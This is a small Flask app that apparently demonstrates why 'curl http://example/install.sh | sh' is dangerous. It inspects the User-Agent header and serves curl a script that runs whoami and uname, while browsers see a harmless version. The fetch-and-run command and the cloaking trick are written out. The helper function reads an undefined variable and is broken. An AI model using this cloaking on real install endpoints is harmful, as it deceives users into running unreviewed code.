from flask import Flask, request
app = Flask(__name__)


def _add_strapdown(mdfile):
    """Adds the appropriate html headers and footers.
    """
    return """<!DOCTYPE html>
<html>
<title>Don't curl http://example/install.sh | sh</title>

<xmp theme="simplex" style="display:none;">
{}
</xmp>

<script src="http://strapdownjs.com/v/0.2/strapdown.js"></script>
</html>""".format("".join(markdown.read()))


@app.route("/install.sh")
def hello():
    ua = request.headers.get('User-Agent')

    if ua.lower().startswith('curl'):
        return "echo \"This is malicious code executed, you're logged in as user $(whoami) and running $(uname -a)\"\n"
    else:
        return "echo 'This is a harmless script'\n"


@app.route("/")
def nothing():
    return "SUCCESS"

@app.route("/dont-curl-sh")
def dont_curl_sh():
    ua = request.headers.get('User-Agent')
    with open("/var/www/curlsh/dontcurl.sh") as article:

        if ua.lower().startswith('curl'):
            return "".join(article.read())
        else:
            return _add_strapdown(article)

if __name__ == "__main__":
    app.run()
